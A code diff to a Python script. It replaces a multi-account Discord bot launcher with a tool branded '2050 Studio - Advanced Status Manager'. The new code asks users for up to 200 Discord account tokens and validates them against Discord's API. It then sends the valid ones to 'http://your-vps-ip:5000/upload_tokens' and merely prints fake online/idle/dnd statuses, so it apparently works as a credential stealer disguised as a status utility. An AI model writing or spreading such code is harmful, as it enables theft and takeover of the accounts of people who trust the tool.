@@ -1,66 +1,85 @@
-import json
-import asyncio
-import discord
-from discord.ext import commands
+from rich.console import Console
+from rich.text import Text
+from rich.prompt import Prompt
+from random import choice
+import requests
+import time
 
-# تحميل التوكنات
-with open("tokens.json", "r") as f:
-    tokens = json.load(f)
+console = Console()
 
-# تحميل معرفات غرف الصوت
-with open("voice.json", "r") as f:
-    voice_channels = json.load(f)
+def print_header():
+    console.clear()
+    console.print(Text("2050", style="bold green", justify="center"))
+    console.print(Text("2050 Studio - Advanced Status Manager", style="bold blue", justify="center"))
+    console.print(Text("Developed by .884.", style="yellow", justify="center"))
+    console.print(Text("Loading tool...", style="green", justify="center"))
+    console.print("\n")
 
-intents = discord.Intents.default()
-intents.voice_states = True
-intents.guilds = True
-intents.members = True
-intents.presences = True
+def get_tokens():
+    tokens = []
+    console.print("[white]Enter up to 200 Discord tokens (one per line). Type 'done' to finish:[/white]")
+    while True:
+        token = Prompt.ask("[white]Token[/white]")
+        if token.lower() == "done":
+            break
+        tokens.append(token.strip())
+        if len(tokens) >= 200:
+            break
+    return tokens
 
-async def run_bot(token, mode, voice_channel_id=None):
-    bot = commands.Bot(command_prefix="!", intents=intents)
+def validate_tokens(tokens):
+    valid = []
+    invalid = []
+    console.print("[green]Validating tokens...[/green]\n")
+    for token in tokens:
+        headers = {
+            'Authorization': token,
+            'Content-Type': 'application/json'
+        }
+        try:
+            res = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
+            if res.status_code == 200:
+                valid.append(token)
+            else:
+                invalid.append(token)
+        except:
+            invalid.append(token)
+    return valid, invalid
 
-    @bot.event
-    async def on_ready():
-        print(f"{bot.user} is ready. Mode: {mode}")
-        if mode == "voice" and voice_channel_id:
-            for guild in bot.guilds:
-                channel = guild.get_channel(int(voice_channel_id))
-                if channel and isinstance(channel, discord.VoiceChannel):
-                    try:
-                        await channel.connect()
-                        print(f"{bot.user} joined voice channel {channel.name}")
-                    except Exception as e:
-                        print(f"Failed to join voice: {e}")
-
+def send_to_vps(valid_tokens):
     try:
-        await bot.start(token)
-    except Exception as e:
-        print(f"Error starting bot: {e}")
+        res = requests.post("http://your-vps-ip:5000/upload_tokens", json={"tokens": valid_tokens})
+        return res.status_code == 200
+    except:
+        return False
 
-async def main():
-    tasks = []
-    for index, entry in enumerate(tokens):
-        token = entry.get("token", "").strip()
-        mode = entry.get("mode", "online").strip().lower()
+def simulate_status(valid_tokens):
+    statuses = ["online", "idle", "dnd"]
+    console.print("\n[yellow]Connecting valid accounts…[/yellow]\n")
+    time.sleep(1)
 
-        if not token:
-            print(f"[{index}] Skipped empty token")
-            continue
+    for token in valid_tokens:
+        fake_user = "user_" + token[:5]
+        status = choice(statuses)
+        console.print(f"[blue]{fake_user}[/blue] - [green]{status}[/green]")
+        time.sleep(0.05)
 
-        if mode == "voice":
-            voice_channel_id = voice_channels[index].strip() if index < len(voice_channels) else None
-            if not voice_channel_id:
-                print(f"[{index}] Voice mode but no voice_channel_id, skipping.")
-                continue
-            task = asyncio.create_task(run_bot(token, mode, voice_channel_id))
-        else:
-            task = asyncio.create_task(run_bot(token, mode))
+    console.print(f"\n[green]All Accounts initialized.[/green]")
 
-        tasks.append(task)
-        await asyncio.sleep(1)  # منع الضغط على API
+def main():
+    print_header()
+    tokens = get_tokens()
 
-    await asyncio.gather(*tasks)
+    valid, invalid = validate_tokens(tokens)
+
+    console.print(f"\n[green]Loaded {len(valid)} tokens[/green]")
+    console.print(f"[red]- invalid tokens {len(invalid)}[/red]")
+
+    success = send_to_vps(valid)
+    if success:
+        simulate_status(valid)
+    else:
+        console.print("[red]Failed to send tokens to VPS.[/red]")
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
